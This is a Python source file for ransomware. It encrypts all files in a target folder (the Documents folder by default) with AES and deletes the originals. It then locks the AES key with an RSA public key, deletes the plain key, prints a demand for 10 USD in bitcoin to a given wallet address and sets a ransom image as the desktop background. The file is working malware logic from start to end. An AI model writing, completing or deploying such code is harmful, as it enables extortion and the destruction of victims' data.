from Crypto.Cipher import AES, PKCS1_OAEP
from tools import change_background, get_venv_var, all_files, delete_file
from tools import read_bytes, write_bytes, ABS_ROUTE_TARGET_FOLDER, AES_KF, PUB_KF
from mykeys import bytes_to_RSA_key
from os.path import isfile


def encrypt_file_aes(file_name: str, aes_key: bytes) -> None:
    file_data = read_bytes(file_name)

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


def encrypt_file_RSA(file_name: str, pub_key) -> None:
    data = read_bytes(file_name)
    cipher = PKCS1_OAEP.new(pub_key)
    encrypted_data = cipher.encrypt(data)
    write_bytes(encrypted_data, file_name + '.enc')


if __name__ == '__main__':

    TARGET = get_venv_var('TARGET')
    if TARGET == None:
        TARGET = ABS_ROUTE_TARGET_FOLDER

    #print('target:', TARGET)

    target_files = all_files(TARGET)

    assert isfile(AES_KF), 'No AES key, can\'t encrypt.'
    assert isfile(PUB_KF), 'No PublicRSA key, can\'t encrypt.'

    aes_key = read_bytes(AES_KF)
    for file in target_files:
        encrypt_file_aes(file, aes_key)
        delete_file(file)

    pub_key = bytes_to_RSA_key(read_bytes(PUB_KF))
    encrypt_file_RSA(AES_KF, pub_key)
    delete_file(AES_KF)

    print('Your files in the Documents folder have been encrypted')
    print('to recover them send 10 USD worth of bitcoin to this address:')
    print('\tmnw7zmS1jFVy2n55NM14r7jVreYtfbedCd')
    change_background('.ransom.png')
